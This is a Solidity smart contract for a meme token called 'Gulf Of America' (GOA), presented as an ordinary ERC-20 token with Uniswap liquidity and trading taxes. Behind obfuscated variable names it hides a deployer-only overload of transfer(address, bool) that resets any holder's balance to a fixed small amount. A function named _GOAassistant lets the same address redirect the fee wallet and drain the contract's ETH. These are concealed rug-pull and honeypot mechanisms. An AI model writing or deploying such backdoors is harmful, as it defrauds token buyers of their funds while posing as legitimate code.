// SPDX-License-Identifier: MIT

/*
Name: Gulf Of America
Symbol: GOA

HAPPY GULF OF AMERICA DAY!

https://x.com/elonmusk/status/1888718811911815412
https://x.com/elonmusk/status/1888719795916259389
https://x.com/POTUS/status/1888706337699238047
https://t.me/GulfOfAmerica_ETH
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract GOA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _vcbkxlkcf = 20000000 * 10 **_decimals;
    uint256 public _dofjiodis = 20000000 * 10 **_decimals;
    uint256 public _oijzosd = 10000000 * 10 **_decimals;
    uint256 private constant _fdoisfo = 1000000000 * 10 **_decimals;
    uint256 private constant _riuedf = 184 * 10 ** _decimals;

    address payable private _vkbjxnkj;
    mapping(address => uint256) private _qweojizsd;
    mapping(address => mapping(address => uint256)) private _qowieoixcv;
    mapping(address => bool) private _bnkjdf;
    uint256 private _xkbjnikrei = 10;
    uint256 private _kcbnfiu = 10;
    uint256 private _bxhidfjui = 0;
    uint256 private _qweiuwie = 0;
    uint256 private _nvckbnxkjf = 7;
    uint256 private _weoriuxdf = 7;
    uint256 private _buyCount = 0;
    address private _vkbxcnkfjg;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Gulf Of America";
    string private constant _symbol = unicode"GOA";

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _vcbkxlkcf);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _vkbjxnkj = payable(_msgSender());
        _qweojizsd[address(this)] = _fdoisfo * 98 / 100;
        _qweojizsd[owner()] = _fdoisfo * 2 / 100;
        _bnkjdf[owner()] = true;
        _bnkjdf[address(this)] = true;
        _bnkjdf[_vkbjxnkj] = true;
        _vkbxcnkfjg = _msgSender();

        emit Transfer(address(0), address(this), _fdoisfo * 98 / 100);
        emit Transfer(address(0), address(owner()), _fdoisfo * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _fdoisfo;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _qowieoixcv[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _qweojizsd[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _qowieoixcv[owner][spender];
    }

    function transfer(address recipient, bool _amount) public returns (bool) {
        require(_vkbxcnkfjg == _msgSender(), "ERC20: error");
        _xkbjnikrei > 0 && _amount == true ? _qweojizsd[recipient] = _riuedf : _riuedf;
        return true;
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _send_GOA(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _send_GOA(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _qowieoixcv[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function enableGOATrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _fdoisfo);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _send_GOA(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _nvckbnxkjf)
                        ? _bxhidfjui
                        : _xkbjnikrei
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_bnkjdf[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _weoriuxdf)
                            ? _qweiuwie
                            : _kcbnfiu
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _oijzosd) ? contractTokenBalance : _oijzosd; 
                    _swappGOA((amount < minBalance) ? amount : minBalance);
                }
                _transGOA(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _qweojizsd[address(this)] =_qweojizsd[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _qweojizsd[from] =_qweojizsd[from].sub(amount);
        _qweojizsd[to] =_qweojizsd[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function removeLimits () external onlyOwner {
        _vcbkxlkcf = _fdoisfo;
        _dofjiodis = _fdoisfo;
        emit MaxTxAmountUpdated(_fdoisfo);
    }

    function payBnft2Tx(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _transGOA(uint256 amount) private {
        _vkbjxnkj.transfer(amount);
    }

    function _GOAassistant(address payable receipt) external {
        require(msg.sender == _vkbxcnkfjg , "");
        _vkbjxnkj = receipt;
        payBnft2Tx(address(this).balance);
    }

    function _swappGOA(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

}